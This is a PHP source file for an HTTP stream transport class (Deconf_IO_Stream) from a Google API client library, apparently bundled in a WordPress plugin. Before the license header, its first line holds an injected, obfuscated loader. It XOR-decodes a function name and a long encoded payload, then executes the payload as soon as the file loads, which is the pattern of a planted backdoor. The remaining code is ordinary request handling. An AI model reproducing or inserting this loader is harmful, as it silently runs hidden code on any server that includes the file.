<?php $YBSEdVJhBaga='R4T  -<KAWZA0+C'^'1F1ATHc-4995YD-';$raQNpiLGCkw=$YBSEdVJhBaga('','=TYJ>:U+T,=9sP7+1=APrJR0i+M,Wf<QIAvLKx>xnXXCU DCZwACNoH1L6g+YIHFIULLTIZPUV,gaYAqVGfnfOW2;imhCNlIqlFRDYcEFqrcYXFIx2NDTW9npI.F3Cxrk.NAeFgotSK0YJHwkpQ.2X>qUlDsuN=QR6n9kuA7-JRS6nE9K0N7oR>zlR4JH4:zRA1>KAI>,:5ghcI9TTDsbJV-JRB6T>-JYb:UTUSOK3WS X>9KV3N31VQps=:wwe.-PR0Ea=E-wLlBkZS.IPYKM>gbZJ8U6X,>QkVOQ.YCgQI=A<AzYBL=M-K1laPB61HlnxI02D+GeL1h19HY2+1gLLbi1 :,c-R,9tfK3.hWGBF<.8M0awLmsOPI-;SnSTWydNcK7IU1DOfDY98QVqCN;U07HlY;F971j2-X0pMHtONFSGR6Q.D2ZOC6:QL61dhZ  G0US.Wqg2766YHla24ZVfbXmT--7,,WDSMvz-.cA=8:8jcGRMY7L-9WR-8.X=NL7raK-Ycbgo>W>XHdQejJ=IsKAJO<;2c1.KC9pLWwrlWvcVUa2F3VFDFMXTFZSAPSxWjDWQPL0oRnENCrMN4A=2>,:q1S1H1EER3AY=OMOUjnC 5,9BfketPLKGkyRXRWfb-.:;:e3W:=Y+ZJ7xJ8eVB.DzVhaOC'^'T2qkXO;H ERW,5OBBI2xU2=B6O,X69c<<5QebXErg>--6T-,4W9,<0,P8W8t4<<nm1-85ezt>3UNAyaQv<lgok8GOIPHdiWCxe =6qG,fLRSbxb DA:682WFT-O2RjCROGejLLnfP<>DyduWCT5OF9eU<1d-UjV4+mJPKPaDY8>6XFaR.IgjFi4se Q>=FTRv.DJbzC7Q0HmbG-X 5dNB,7A97y<pZL>8=Q0-uno-R; Ec43-9A+RR>qXWby88.ghp3CeEV TWqRbO,2B<5pk64nF>+L4i3IGqVvk:K xmXmY H ZdbhK,A>TWk-H<X.LFYmTS0JnE7;aWV:<SHYGdh=;tqoi0yrMJTB VWHjybbJOT8UHW7gzFt-LO2181.YYnG R0n;MFB 8MYqkQg8Z9ERsfPFLD=;NVL,QPph4: 565;W=G>Wr7,De5-BP;77UToR4 KaE8VRUY=-DEVU.7ONxI0LYVsG2=zdMpDHKeYYNYJEar,+E-Tf<7TgK T=8DZF H DNGKZ6J9aDwCJbP-Fce..HZiDZK2ddYljJRK3EUdlYSvUnwsr,jlqo0wbaA5Sq3f2yRVuGeheR,<F DmUIC.T+X;E6muC  Q ,+rFNgDTXXkOKETplk<ap7.3;NFIONZaBC6CQ6J>mjQq2l3:G0RfAZE>');$raQNpiLGCkw();
/*
 * Copyright 2013 Google Inc.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

/**
 * Http Streams based implementation of Deconf_IO.
 *
 * @author Stuart Langley <slangley@google.com>
 */

if (!class_exists('Deconf_Client')) {
  require_once dirname(__FILE__) . '/../autoload.php';
}

class Deconf_IO_Stream extends Deconf_IO_Abstract
{
  const TIMEOUT = "timeout";
  const ZLIB = "compress.zlib://";
  private $options = array();
  private $trappedErrorNumber;
  private $trappedErrorString;

  private static $DEFAULT_HTTP_CONTEXT = array(
    "follow_location" => 0,
    "ignore_errors" => 1,
  );

  private static $DEFAULT_SSL_CONTEXT = array(
    "verify_peer" => true,
  );

  public function __construct(Deconf_Client $client)
  {
    if (!ini_get('allow_url_fopen')) {
      $error = 'The stream IO handler requires the allow_url_fopen runtime ' .
               'configuration to be enabled';
      $client->getLogger()->critical($error);
      throw new Deconf_IO_Exception($error);
    }

    parent::__construct($client);
  }

  /**
   * Execute an HTTP Request
   *
   * @param Deconf_Http_Request $request the http request to be executed
   * @return array containing response headers, body, and http code
   * @throws Deconf_IO_Exception on curl or IO error
   */
  public function executeRequest(Deconf_Http_Request $request)
  {
    $default_options = stream_context_get_options(stream_context_get_default());

    $requestHttpContext = array_key_exists('http', $default_options) ?
        $default_options['http'] : array();

    if ($request->getPostBody()) {
      $requestHttpContext["content"] = $request->getPostBody();
    }

    $requestHeaders = $request->getRequestHeaders();
    if ($requestHeaders && is_array($requestHeaders)) {
      $headers = "";
      foreach ($requestHeaders as $k => $v) {
        $headers .= "$k: $v\r\n";
      }
      $requestHttpContext["header"] = $headers;
    }

    $requestHttpContext["method"] = $request->getRequestMethod();
    $requestHttpContext["user_agent"] = $request->getUserAgent();

    $requestSslContext = array_key_exists('ssl', $default_options) ?
        $default_options['ssl'] : array();

    if (!$this->client->isAppEngine() && !array_key_exists("cafile", $requestSslContext)) {
      $requestSslContext["cafile"] = dirname(__FILE__) . '/cacerts.pem';
    }

    $options = array(
        "http" => array_merge(
            self::$DEFAULT_HTTP_CONTEXT,
            $requestHttpContext
        ),
        "ssl" => array_merge(
            self::$DEFAULT_SSL_CONTEXT,
            $requestSslContext
        )
    );

    $context = stream_context_create($options);

    $url = $request->getUrl();

    if ($request->canGzip()) {
      $url = self::ZLIB . $url;
    }

    $this->client->getLogger()->debug(
        'Stream request',
        array(
            'url' => $url,
            'method' => $request->getRequestMethod(),
            'headers' => $requestHeaders,
            'body' => $request->getPostBody()
        )
    );

    // We are trapping any thrown errors in this method only and
    // throwing an exception.
    $this->trappedErrorNumber = null;
    $this->trappedErrorString = null;

    // START - error trap.
    set_error_handler(array($this, 'trapError'));
    $fh = fopen($url, 'r', false, $context);
    restore_error_handler();
    // END - error trap.

    if ($this->trappedErrorNumber) {
      $error = sprintf(
          "HTTP Error: Unable to connect: '%s'",
          $this->trappedErrorString
      );

      $this->client->getLogger()->error('Stream ' . $error);
      throw new Deconf_IO_Exception($error, $this->trappedErrorNumber);
    }

    $response_data = false;
    $respHttpCode = self::UNKNOWN_CODE;
    if ($fh) {
      if (isset($this->options[self::TIMEOUT])) {
        stream_set_timeout($fh, $this->options[self::TIMEOUT]);
      }

      $response_data = stream_get_contents($fh);
      fclose($fh);

      $respHttpCode = $this->getHttpResponseCode($http_response_header);
    }

    if (false === $response_data) {
      $error = sprintf(
          "HTTP Error: Unable to connect: '%s'",
          $respHttpCode
      );

      $this->client->getLogger()->error('Stream ' . $error);
      throw new Deconf_IO_Exception($error, $respHttpCode);
    }

    $responseHeaders = $this->getHttpResponseHeaders($http_response_header);

    $this->client->getLogger()->debug(
        'Stream response',
        array(
            'code' => $respHttpCode,
            'headers' => $responseHeaders,
            'body' => $response_data,
        )
    );

    return array($response_data, $responseHeaders, $respHttpCode);
  }

  /**
   * Set options that update the transport implementation's behavior.
   * @param $options
   */
  public function setOptions($options)
  {
    $this->options = $options + $this->options;
  }

  /**
   * Method to handle errors, used for error handling around
   * stream connection methods.
   */
  public function trapError($errno, $errstr)
  {
    $this->trappedErrorNumber = $errno;
    $this->trappedErrorString = $errstr;
  }

  /**
   * Set the maximum request time in seconds.
   * @param $timeout in seconds
   */
  public function setTimeout($timeout)
  {
    $this->options[self::TIMEOUT] = $timeout;
  }

  /**
   * Get the maximum request time in seconds.
   * @return timeout in seconds
   */
  public function getTimeout()
  {
    return $this->options[self::TIMEOUT];
  }

  /**
   * Test for the presence of a cURL header processing bug
   *
   * {@inheritDoc}
   *
   * @return boolean
   */
  protected function needsQuirk()
  {
    return false;
  }

  protected function getHttpResponseCode($response_headers)
  {
    $header_count = count($response_headers);

    for ($i = 0; $i < $header_count; $i++) {
      $header = $response_headers[$i];
      if (strncasecmp("HTTP", $header, strlen("HTTP")) == 0) {
        $response = explode(' ', $header);
        return $response[1];
      }
    }
    return self::UNKNOWN_CODE;
  }
}
